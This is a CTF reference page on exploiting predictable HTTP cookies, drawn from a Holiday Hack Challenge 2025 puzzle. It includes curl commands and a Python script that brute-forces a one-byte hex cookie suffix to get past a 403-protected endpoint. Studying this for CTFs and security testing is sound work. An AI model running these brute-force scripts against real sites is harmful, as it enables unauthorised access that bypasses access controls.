# Cookies

## Table of Contents
- [Cookies](#cookies)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
    - [Common Attack Patterns](#common-attack-patterns)
  - [Quick Reference](#quick-reference)
  - [Techniques](#techniques)
    - [Identifying Predictable Cookies](#identifying-predictable-cookies)
    - [Manual Enumeration with cURL](#manual-enumeration-with-curl)
    - [Scripted Brute-Force — Hex Suffix Enumeration](#scripted-brute-force--hex-suffix-enumeration)
    - [Setting Cookies in the Browser](#setting-cookies-in-the-browser)
    - [Setting Cookies with cURL](#setting-cookies-with-curl)
  - [Files](#files)
  - [References](#references)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

HTTP cookies are key-value pairs set by the server and sent back by the browser on every subsequent request. In CTF web challenges, cookies are often used for session management, authorization gating, or feature flags. Weak cookie implementations (e.g., predictable values, insufficient entropy, sequential counters) can be exploited to bypass access controls or unlock hidden functionality.

### Common Attack Patterns
- **Sequential / predictable values:** cookie suffix is an incrementing counter or sequential hex byte.
- **Fixed prefix with small variable suffix:** only the last byte varies, making exhaustive search trivial (256 possibilities).
- **Encoding tricks:** value is base64, hex, or URL-encoded and can be decoded, modified, and re-encoded.
- **Missing `HttpOnly` / `Secure` flags:** cookies readable by JavaScript or transmitted over HTTP.

---

## Quick Reference

| Task | Method |
|---|---|
| Observe cookie values across requests | Browser DevTools → Application → Cookies, or Burp Suite HTTP history |
| Identify fixed prefix | Collect 10–20 values; compare for common leading substring |
| Brute-force 1-byte hex suffix | 256 candidates; script with `requests` library |
| Set cookie in browser | DevTools Console: `document.cookie = "name=value"` |
| Set cookie with cURL | `curl -b "name=value" URL` |

---

## Techniques

### Identifying Predictable Cookies

Collect multiple cookie values by making repeated requests and look for patterns:

```bash
# Collect registration cookie values across 10 requests
for i in $(seq 1 10); do
  curl -s -I https://TARGET/register/ \
    -b "Schrodinger=TOKEN" \
    | grep -i "set-cookie"
done
```

> [!QUESTION] What to look for:
> - A long common prefix with only the last 1–2 bytes changing
> - Values that appear sequential (e.g., `...44a`, `...44b`, `...44c`)
> - A value that is conspicuously absent from the observed range (the "gap" is often the target)

### Manual Enumeration with cURL

Once you have identified the prefix, manually test candidate values:

```bash
# Test a specific candidate cookie against a protected endpoint
curl https://TARGET/protected/path \
  -b "Schrodinger=AUTH_TOKEN; registration=PREFIX44c" \
  -o /dev/null -w "%{http_code}\n"
```

A `200` (or non-`403`) response indicates the cookie value was accepted.

### Scripted Brute-Force — Hex Suffix Enumeration

When the variable portion is a single hex byte (256 possible values), a short Python script can automate collection, analysis, and testing:

> [!EXAMPLE]- Click to expand code
> ```python
> import requests
> from pprint import pprint
> 
> BASE_URL = "https://TARGET"
> REGISTER_URL = f"{BASE_URL}/register/"
> TARGET_URL   = f"{BASE_URL}/register/courses/wip/hidden_path"
> AUTH_TOKEN   = "your-auth-token-here"
> 
> def collect_cookies(session, url, attempts=50):
>     """Collect unique registration cookie values from repeated requests."""
>     seen = set()
>     for _ in range(attempts):
>         r = session.get(url)
>         val = r.cookies.get("registration")
>         if val:
>             seen.add(val)
>     return seen
> 
> def derive_prefix_and_start(values):
>     """Extract fixed prefix and starting byte from observed values."""
>     min_val = min(values)
>     prefix = min_val[:-2]           # everything except last byte
>     start  = int(min_val[-2:], 16)  # last byte as integer
>     return prefix, start
> 
> def generate_candidates(prefix, start):
>     """Generate all 256 candidates starting from observed minimum."""
>     return [f"{prefix}{(start + i) & 0xff:02x}" for i in range(0x100)]
> 
> def test_candidates(session, candidates, url):
>     """Try each candidate; stop on first non-403 response."""
>     for i, candidate in enumerate(candidates, 1):
>         session.cookies.set("registration", candidate)
>         r = session.get(url)
>         result = "NOPE" if r.status_code == 403 else "YES"
>         print(f"[{i}/{len(candidates)}] {candidate} => {result}")
>         if result == "YES":
>             break
> 
> with requests.Session() as s:
>     s.cookies.set("Schrodinger", AUTH_TOKEN)
> 
>     values = collect_cookies(s, REGISTER_URL)
>     pprint(values)
> 
>     prefix, start = derive_prefix_and_start(values)
>     print(f"Prefix: {prefix}  Start: {start:02x}")
> 
>     candidates = generate_candidates(prefix, start)
>     test_candidates(s, candidates, TARGET_URL)
> ```

**Key observations from the algorithm:**
- Collecting from the `/register/` endpoint first populates the set of observed values
- The minimum observed value anchors the search range.
- The valid cookie is often the one *absent* from the observed set; the server never hands it out normally, but accepts it when presented.
- Wrapping with `& 0xff` ensures the search wraps cleanly past `0xff` back to `0x00`.

### Setting Cookies in the Browser

After identifying a valid cookie value, set it directly in the browser without a tool:

```js
// DevTools Console
document.cookie = "registration=eb72a05369dcb44c; path=/";
```

Then reload the page.

Alternatively, use the **Application** tab in DevTools:
- Navigate to Storage → Cookies → select the domain.
- Double-click the value field for the cookie and edit it directly.

### Setting Cookies with cURL

```bash
# Single cookie
curl https://TARGET/path -b "registration=eb72a05369dcb44c"

# Multiple cookies
curl https://TARGET/path -b "Schrodinger=TOKEN; registration=eb72a05369dcb44c"
```

---

## Files

| File | Description | Source |
|---|---|---|
| [`detect_registration_cookie.py`](../../../ctf-writeups/holiday-hack-challenge/2025/act-iii/schroedingers-scope/detect_registration_cookie.py) | Full script: collect, derive prefix, generate candidates, test | [HHC 2025 Act III - Schrödinger's Scope](../../../ctf-writeups/holiday-hack-challenge/2025/act-iii/schroedingers-scope/README.md) |

---

## References

### Challenges
| Source | Name |
|---|---|
| Holiday Hack Challenge 2025, Act III | [Schrödinger's Scope](../../../ctf-writeups/holiday-hack-challenge/2025/act-iii/schroedingers-scope/README.md) |

### Web Sites
- [HackTricks — Cookies Hacking](https://angelica.gitbook.io/hacktricks/pentesting-web/hacking-with-cookies)
- [OWASP — Testing for Cookies Attributes](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)
